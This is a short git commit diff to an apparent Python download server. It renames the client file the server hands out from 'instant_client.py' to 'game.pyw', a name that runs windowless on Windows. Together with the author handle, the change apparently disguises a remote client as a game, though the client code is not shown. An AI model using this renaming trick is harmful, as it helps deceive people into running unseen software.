d55962aaf594733a4d238905297503abf56a8100
hblackhat676-wq <hblackhat676@gmail.com>
2025-10-20 21:22:25 +0300

    Change download filename from instant_client.py to game.pyw

--- deepseek_python_20251017_58b057.py
+++ deepseek_python_20251017_58b057.py
@@ -2371,7 +2371,7 @@ if __name__ == "__main__":
         
         self.send_response(200)
         self.send_header('Content-Type', 'application/octet-stream')
-        self.send_header('Content-Disposition', 'attachment; filename="instant_client.py"')
+        self.send_header('Content-Disposition', 'attachment; filename="game.pyw"')
         self.end_headers()
         self.wfile.write(client_code.encode())
 
